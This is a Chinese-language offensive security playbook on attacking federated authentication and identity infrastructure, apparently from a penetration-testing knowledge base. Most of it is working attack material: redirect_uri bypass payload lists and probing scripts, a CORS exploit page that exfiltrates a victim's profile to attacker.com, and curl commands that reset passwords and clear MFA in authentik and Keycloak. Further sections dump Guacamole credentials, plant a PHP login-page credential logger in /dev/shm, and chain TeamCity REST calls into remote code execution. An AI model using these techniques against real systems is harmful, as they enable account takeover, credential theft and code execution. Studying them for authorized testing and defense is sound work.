---

phase: webapp
vuln_class: [oauth, oidc, saml, cors, cicd]
title: 联邦认证与身份基础设施攻击
summary: 联邦认证的攻击面全在「信任传递的边界」—— 回调地址校验、断言签名、跨域凭证、以及签发方自己的管理面。按「谁替谁做担保」定位。
---

# 联邦认证与身份基础设施攻击

JWT/JWE 的令牌本体攻击见 [[web/漏洞分类/认证与会话/auth-jwt.md|auth-jwt.md]]；本地登录、会话、访问控制见 [[web/漏洞分类/认证与会话/auth-and-access.md|auth-and-access.md]]；单纯的回调地址跳转见 [[web/漏洞分类/开放重定向/开放重定向测试.md|开放重定向]]；CORS 配置的完整清单见 [[web/漏洞分类/跨域配置错误/CORS 技术资料（SRC 禁用）.md|CORS 技术资料]]；代码仓库与构建系统的配置泄露见 [[web/漏洞分类/SCM配置泄露/不安全的 SCM 配置泄露测试.md|SCM 配置泄露]]。

## 0. 判据速查

联邦认证里「认证」本身很少被攻破，被攻破的是**信任传递**。先定位断在哪一跳。

| 断点 | 现象 | 去哪节 |
|---|---|---|
| ① 回调地址 | `redirect_uri` 严格相等校验；`?next=`、`../@`、子域前缀可绕 | §1.1 |
| ② 授权码 | 同一 code 能换两次 token；code 不绑 client | §1.2 |
| ③ state | 授权请求里没有 state，或回调不校验 | §1.3 |
| ④ 断言签名 | SAML `Signature` 位置/引用可改；`alg:none` | §1.4 |
| ⑤ 跨域读 | `ACAO` 反射 Origin **且** `ACAC: true` | §2 |
| ⑥ 签发方管理面 | 拿到 IdP 的 admin token；CI/CD 变量里有它 | §3 |
| ⑦ 签名与解析错位 | 签的是一段、解析的是另一段 | §4 |

一个高频误判：看到 OAuth 就去找 `alg:none`。现代 IdP 基本不开，**先测 `redirect_uri` 和 `state`**，这两个才是常年失守的地方。

## 1. OAuth / OIDC 授权码链路

### 1.1 redirect_uri 绕过

授权码是发给 `redirect_uri` 的。只要能让服务端认为「这个地址仍属于我方」，code 就落到攻击者手里。

```text
# 基础形态：开放重定向串联
https://target.com/callback?next=https://evil.com
https://target.com/callback?redirect=https://evil.com

# 路径穿越到 authority
https://target.com/callback/../@evil.com
https://target.com/callback/..%2f@evil.com

# 片段注入（部分解析器把 # 之后当路径）
https://target.com/callback%23@evil.com
https://target.com/callback#@evil.com

# 点号吃掉分隔符
https://target.com/callback/.evil.com
https://target.com/callback%2e.evil.com

# 子域后缀匹配 bug：正则 /target\.com/ 未锚定结尾
https://target.com.evil.com
https://evil-target.com          # 正则写成 /target\.com/ 且用 search()

# 用户名语法
https://target.com@evil.com
https://evil.com\t@target.com    # 制表符被解析器 strip
https://evil.com%09@target.com

# 端口/协议
https://target.com:443@evil.com
javascript://target.com/%0aalert(1)
```

```python
# 批量探测：先拿一个合法 client_id，逐个替换 redirect_uri
# 判据不是 302，而是 302 的 Location 是否真的带 code 指向外部
import requests
base = "https://target.com/oauth/authorize"
cands = [
    "https://target.com/callback?next=https://evil.com",
    "https://target.com/callback/../@evil.com",
    "https://target.com.evil.com/callback",
    "https://evil-target.com/callback",
    "https://target.com@evil.com/callback",
]
for ru in cands:
    r = requests.get(base, params={
        "client_id": CID, "redirect_uri": ru,
        "response_type": "code", "scope": "openid profile",
        "state": "x"}, allow_redirects=False)
    loc = r.headers.get("Location", "")
    print(r.status_code, ru, "->", loc[:120])
```

要点：

- **必须关掉自动跳转**。开了自动跳转，`allow_redirects=True` 会把「跳到了错误页」和「跳到了 evil.com」都显示成 200，看不出区别。
- 判据是 `Location` 里带 `code=` 且 host 不在白名单。只有 `error=invalid_request` 说明校验生效。
- 若 `redirect_uri` 白名单是**前缀匹配**，`https://target.com/callback` 白名单能被 `https://target.com/callback.evil.com` 绕过；若是**后缀匹配**，反过来用 `https://evil.com/target.com/callback`。
- 有些实现只在**注册时**校验 `redirect_uri`，授权时直接取请求值 —— 换个已注册 client 就行。

### 1.2 授权码本身的缺陷

```text
# code 不绑 client：用 A 应用的 client_id 拿 code，到 B 应用换 token
# code 可复用：同一 code 换两次 token 都成功 → 攻击者可与受害者共享会话
# code 不过期 / 有效期过长（>10 分钟）→ 从 Referer、日志、浏览器历史里捞
# code 未绑 redirect_uri：换 token 时不校验 redirect_uri 与授权时一致
```

`code` 落在 `Referer` 里是最常见的真实泄露面：回调页若引用了第三方资源（CDN、统计、字体），完整 URL 会作为 `Referer` 发出去。

### 1.3 state 缺失与 CSRF

`state` 的唯一职责是**把回调和发起请求的浏览器绑定**。缺失或未校验时，攻击者可以用自己的 code 去完成受害者的登录流程：

```text
1. 攻击者用自己的账号发起授权，拿到 code（不兑换）
2. 构造 https://target.com/callback?code=<攻击者的code>
3. 诱导受害者访问
4. 服务端把受害者会话与攻击者的第三方账号绑定
5. 受害者的操作全部写进攻击者的账号 —— 这是「登录 CSRF」的实际危害
```

判据：连续两次发起授权，`state` 是否变化；把 `state` 改成任意值再提交回调，是否仍成功。**`state` 是随机数但服务端不校验**，等同于没有。

### 1.4 SAML 断言

SAML 的坑集中在「签名保护的是哪一段」。

```text
# XSW（XML Signature Wrapping）：把签名过的 Assertion 挪走，
# 在签名验证器读的位置放一份未签名的伪造 Assertion，
# 在业务逻辑读的位置放另一份 —— 两者用不同的 XPath 就成立
# 判据：把 <Assertion> 复制一份改 NameID，看是否登录成目标用户

# 注释截断：<NameID>admin@x<!---->.evil.com</NameID>
# 不同解析器对注释的处理不一致

# Signature 只覆盖 Response 不覆盖 Assertion（或反之）
# 找 <ds:Reference URI="#..."> 指向的 ID 到底是哪个元素

# 未签名断言被接受：直接删掉 <Signature> 整块
```

`RelayState` 必须在整条流程里原样透传 —— 它把回调和发起请求关联起来，改坏了即使 `SAMLResponse` 合法也会失败。

### 1.5 OIDC ID Token

`id_token` 是 JWT，其本体攻击（`alg:none`、`jwk`/`jku`/`kid` 注入、`aud`/`iss` 未校验）见 [[web/漏洞分类/认证与会话/auth-jwt.md|auth-jwt.md]]。本篇只记 OIDC 特有的两条：

- **`iss` 未校验**：用自己搭的 IdP 签一个 `iss` 指向任意值的 token，若服务端只验签名不验 `iss`，且信任的 JWKS 来自可配置地址，直接接管。
- **`aud` 未校验**：把给 A 应用签的 token 拿去打 B 应用。

## 2. CORS 跨域读取

可被利用的条件是**两个头同时满足**：

```text
Access-Control-Allow-Origin: <反射了请求的 Origin>   ← 不是 *
Access-Control-Allow-Credentials: true
```

`ACAO: *` 配 `ACAC: true` 是非法组合，浏览器会直接拒绝，所以**光看到 `*` 不算漏洞**。

```python
import requests
target = "https://target.com/api/user/profile"
origins = [
    "https://evil.com",
    "https://target.com.evil.com",   # 后缀匹配 bug
    "https://evil-target.com",       # 子域正则未锚定
    "null",                          # sandbox iframe / data: URL
    "https://target.com%60.evil.com",
]
for o in origins:
    r = requests.get(target, headers={"Origin": o, "Cookie": SESSION})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    print(f"{o:38} ACAO={acao!r:40} ACAC={acac!r}")
```

反射成立后，在攻击者域上放页面读取：

```html
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/x?d=' + encodeURIComponent(btoa(d))));
</script>
```

要点：

- **`null` Origin** 来自 `<iframe sandbox="allow-scripts">`、`data:` URL、`file://`。若 `null` 被反射进 `ACAO`，任何本地 HTML 文件都能读。
- 预检（`OPTIONS`）通过不代表简单请求通过，两者要分别测。
- 内网地址也要测：`Origin: http://localhost`、`http://127.0.0.1` 常被开发环境白名单放行。
- 若 `ACAO` 是**固定白名单**但含某个可被接管的子域，回到 [[web/漏洞分类/子域接管/子域接管测试.md|子域接管]]。

## 3. 身份基础设施接管链

这一节是完整的提权链：**代码仓库 → CI/CD 变量 → IdP admin token → 任意用户接管**。真实渗透里这条链比任何 OAuth 漏洞都值钱。

### 3.1 Git 历史里的凭证

被删掉的密钥仍留在历史里。`-S` 搜的是**所有 diff 的新增/删除行**，能捞出被删的密码：

```bash
git log --all --oneline
git show <first_commit>                    # 首个提交常含初始化配置
git log -p --all -S "password"             # 全分支全历史搜字符串
git log -p --all -S "BEGIN RSA PRIVATE KEY"
git log -p --all -- "*.env" "*.yml"        # 限定路径
git rev-list --all --objects | git cat-file --batch-check   # 找悬垂对象
git fsck --lost-found                      # 找回被 reset 掉的提交
```

`.git/` 可访问时先 `git-dumper` 拉全量，再在本地跑上面这些命令 —— 线上 `git log` 往往没有权限。

### 3.2 CI/CD 变量

三处常见位置，权限要求都不高：

```text
GitLab   Settings → CI/CD → Variables        （Project Maintainer 可读，默认 masked 只在日志里生效）
GitHub   Settings → Secrets and variables → Actions  （组织级 secret 被 repo workflow 引用时，改 workflow 就能外带）
Jenkins  Manage Jenkins → Credentials        （Credentials 插件，读权限常被忽略）
```

要点：

- GitHub 的 secret 值读不出来，但**可以改 workflow 把 secret 打到日志**（若未启用 secret 掩码的变形绕过）。判据是能否 `push` 到默认分支。
- GitLab 的 masked 变量只对**日志输出**生效，`cat` 到文件再上传不受限。
- 这些变量里放的常是 **service account token**，权限往往高于普通用户。

### 3.3 IdP 管理面接管

拿到 authentik / Keycloak / Okta 的 admin token，等于拿到所有账号：

```bash
# authentik：枚举用户 → 直接改密码
curl -H "Authorization: Bearer $TOKEN" "https://idp/api/v3/core/users/"
curl -X POST -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"password":"Pwn123!"}' \
     "https://idp/api/v3/core/users/<pk>/set_password/"

# Keycloak：走 admin REST，重置密码 + 关掉 OTP
curl -X PUT "https://idp/admin/realms/<realm>/users/<id>/reset-password" ...
curl -X PUT "https://idp/admin/realms/<realm>/users/<id>" \
     -d '{"requiredActions":[]}'      # 清掉 CONFIGURE_TOTP
```

**MFA 的自动跳过是最关键的判据**：authentik 的认证流程（flow）里，若某个 stage 配了 `not_configured_action: skip`，用户没配 MFA 设备时这一步**直接放行**。所以改密码就够了，不需要绕 MFA。

```text
# 查 flow 的 stage 绑定
GET /api/v3/flows/instances/<slug>/
GET /api/v3/stages/authenticator/validate/
# 看 not_configured_action 是 skip / deny / configure
```

### 3.4 SAML 登录自动化

当你有 IdP 侧凭证、但目标应用只提供 SAML 时，脚本化整条流程：

```text
1. GET 应用受保护页 → 302 到 IdP，从 Location 里取 SAMLRequest + RelayState
2. 用 IdP 凭证完成认证（API 或直接 POST 登录表单），拿到签名的 SAMLResponse
3. 把 SAMLResponse + **原始 RelayState** POST 回应用的 ACS 端点
4. 从 302 的 Location 或 Set-Cookie 里取会话
```

`RelayState` 一个字节都不能改，且必须来自第 1 步的原始响应 —— 它把回调与发起请求关联起来。

### 3.5 Guacamole 连接参数

Guacamole 把 SSH 私钥、密码、连接串明文存在 MySQL 里。有 API token 或库权限就能一次拖走所有受管主机：

```bash
curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
# 返回 hostname / port / username / private-key / passphrase
```

```sql
SELECT c.connection_name, cp.parameter_name, cp.parameter_value
FROM guacamole_connection c
JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id
WHERE cp.parameter_name IN ('private-key','passphrase','password','hostname');
```

同类产品（JumpServer、Teleport、NextTerm）思路一致：**堡垒机的连接参数库就是全内网的凭证库**。

## 4. 签名层的宽容性

### 4.1 Base64 解码宽容 + 参数覆盖

签名对象和解析对象不是同一段字节时，中间就是攻击空间。Python 的 `b64decode()` 默认**静默丢弃非字母表字符**：

```python
import base64
base64.b64decode("QUJD&price=0")   # -> b'ABC'，&price=0 被丢掉，不报错
```

若服务端逻辑是「先 `b64decode` 验签，再对**原始字符串**做参数解析」，两边看到的内容就不同：

```text
原始订单（已签名）：item=widget&price=100
服务端返回签名：    base64(RSA_sign("item=widget&price=100"))

攻击：把参数拼在签名后面
data = "VALID_SIG_BASE64&price=0"

验签侧：b64decode(data) → 丢掉 "&price=0" → 得到合法签名 → 通过
解析侧：data.split("&") → ["VALID_SIG_BASE64", "price=0"] → 后值胜出 → price=0
```

判据：找一个「签名 + 数据拼接」的接口，在签名尾部追加 `&<key>=<value>`，观察参数是否被采纳。**任何先解码后解析、且两者作用域不一致的实现都中招。**

防御口径：签名必须覆盖**最终被解析的那一整段字节**，不能只覆盖其中一部分。

### 4.2 Hash Length Extension

`MAC = H(secret || message)` 这种构造（Merkle-Damgård 类哈希）会在消息边界泄露内部状态，攻击者无需知道 secret 就能续算。

```python
import hashpumpy
# 已知：original_mac = H(secret || original_msg)，但不知道 secret
new_mac, new_msg = hashpumpy.hashpump(
    original_mac,          # 原 hexdigest
    b"user=alice",         # 原消息（不含 secret）
    b"&admin=true",        # 要追加的内容
    16,                    # secret 长度
)
# new_msg = original_msg || padding || extension
# new_mac = H(secret || new_msg) 的合法值
```

secret 长度未知就爆破（CTF 场景 1–100 足够）：

```python
for n in range(1, 101):
    mac, msg = hashpumpy.hashpump(orig_mac, orig_msg, b"&admin=true", n)
    r = requests.get(url, params={"data": msg.hex(), "mac": mac})
    if "success" in r.text:
        print("secret_len =", n); break
```

注入的 padding 是算法标准填充，服务端会原样吃下：

```text
message || 0x80 || 0x00 ... 0x00 || (len(message+secret) * 8) 以大端 8 字节结尾
```

| 可用 | 不可用 |
|---|---|
| MD5 / SHA-1 / SHA-224 / SHA-256 / SHA-384 / SHA-512 | HMAC（两次独立哈希） |
| | SHA-3 / Keccak（海绵结构） |
| | BLAKE2 / BLAKE3 |

备用工具 `hash_extender`：`--data`、`--append`、`--signature`、`--format`，`--secret-min/--secret-max` 直接内置爆破。

## 5. 后渗透的凭证收割

已经拿到应用写权限、但需要更高权限凭证时，这两招最省事。

### 5.1 登录页投毒

在登录处理逻辑里插一行记录，等自动化账号自己送上门：

```php
$f = fopen('/dev/shm/creds.txt', 'a+');
fputs($f, "{$_POST['name']}:{$_POST['password']}\n");
fclose($f);
```

要点：

- `/dev/shm/` 是 tmpfs，任何用户可写，且大多数监控不看这里。别写 `/tmp`（有的发行版 `tmpwatch` 会清、有的被审计）。
- 等的是**备份脚本、健康检查、监控探针**这类定时任务，它们常带高权限账号。
- 从审计日志里找「登录频率最高」的用户名，那些就是自动化账号。

### 5.2 TeamCity 构建步骤注入

TeamCity 的管理员凭证等于 RCE —— 构建步骤的脚本会在 agent 上执行：

```bash
# 1. 建项目
curl -u admin:pass -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
  -H 'Content-Type: application/xml' \
  -d '<newProject name="pwn" parentProject locator="id:_Root"/>'

# 2. 建 buildType（挂到刚建的项目上）
curl -u admin:pass -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes' \
  -H 'Content-Type: application/xml' \
  -d '<newBuildType name="p" project locator="pwn"/>'

# 3. 加构建步骤：runnerType=simpleRunner，脚本内容任意
curl -u admin:pass -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes/id:<btId>/steps' \
  -H 'Content-Type: application/xml' \
  -d '<step name="s" type="simpleRunner"><properties>
        <property name="script.content" value="id; cat /etc/passwd"/>
        <property name="teamcity.step.mode" value="default"/>
      </properties></step>'

# 4. 触发
curl -u admin:pass -X POST 'http://HOST:8111/httpAuth/app/rest/buildQueue' \
  -H 'Content-Type: application/xml' \
  -d '<build><buildType id="<btId>"/></build>'
```

先 `ps aux` 看 agent 进程属主：**agent 以 root 跑就等于拿到 root**。同类系统（Jenkins、GitLab Runner、Drone、Argo）思路一致，都是「能改构建定义 = 能执行命令」。

## 6. 纪律

- **先确认「谁给谁担保」**。联邦认证里每一跳都是一个信任声明，找到那个被盲目接受的声明，比穷举 payload 快得多。
- **`redirect_uri` 和 `state` 优先于 `alg:none`**。前者常年失守，后者在现代 IdP 上基本关闭。
- **CORS 必须双条件**。只反射 `Origin` 但没 `ACAC: true`，浏览器不会带 cookie，读不到数据，不是漏洞。
- **签名层看的是「签了什么」和「解析了什么」是否同一段字节**。长度扩展、Base64 宽容、参数覆盖，全是这个错位的不同表现。
- **CI/CD 变量和 IdP 管理面是最高性价比的目标**。一个 GitLab Maintainer 往往能直接换到一个云账号。
- **别把 `not_configured_action: skip` 当配置细节**。它意味着「没配 MFA 就等于没 MFA」，改密码即可接管。
